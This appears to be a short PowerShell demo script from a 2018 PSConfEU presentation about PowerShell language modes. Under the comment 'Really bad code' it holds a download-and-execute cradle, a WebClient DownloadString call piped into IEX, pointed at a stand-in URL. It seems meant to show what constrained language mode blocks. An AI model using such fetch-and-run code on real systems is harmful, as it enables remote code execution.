<#  
        .NOTES 
        ============================================================================
        Date:       20.04.2018
        Presenter:  David das Neves 
        Version:    1.0
        Project:    PSConfEU - Demo 
        Ref:        

        ============================================================================ 
        .DESCRIPTION 
        Presentation data        
#> 

$ExecutionContext.SessionState.LanguageMode 

#$ExecutionContext.SessionState.LanguageMode=[System.Management.Automation.PSLanguageMode]::ConstrainedLanguage

#$ExecutionContext.SessionState.LanguageMode=[System.Management.Automation.PSLanguageMode]::FullLanguage

#Really bad code
$someverybadsite='http://google.de'
$content = (New-Object Net.WebClient).DownloadString($someverybadsite)
IEX $content;
Invoke-SomeVeryBadStuff